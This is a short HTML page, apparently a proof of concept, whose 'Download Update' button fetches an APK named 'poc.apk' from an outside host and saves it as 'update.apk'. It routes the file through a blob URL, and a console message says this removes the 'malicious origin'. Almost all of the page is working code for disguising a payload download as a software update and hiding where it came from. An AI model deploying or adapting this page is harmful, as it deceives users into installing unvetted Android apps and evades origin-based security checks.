<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <style>
    .btn { background:#4CAF50; color:white; padding:15px 32px; font-size:16px; border:none; cursor:pointer; border-radius:8px; }
  </style>
</head>
<body>
  <center>
    <button class="btn" onclick="download()">Download Update</button>
  </center>

  <script>
  async function download() {
    try {
      const resp = await fetch('https://aliothme.github.io/poc.apk');
      if (!resp.ok) throw new Error('Fetch failed');
      
      const blob = new Blob([await resp.blob()], {
        type: 'application/vnd.android.package-archive'
      });
      
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = 'update.apk';
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      URL.revokeObjectURL(url);
      
      console.log('Success â€“ origin malicious berhasil dihilangkan (blob URL)');
    } catch(e) {
      console.error(e);
    }
  }
  </script>
</body>
</html>
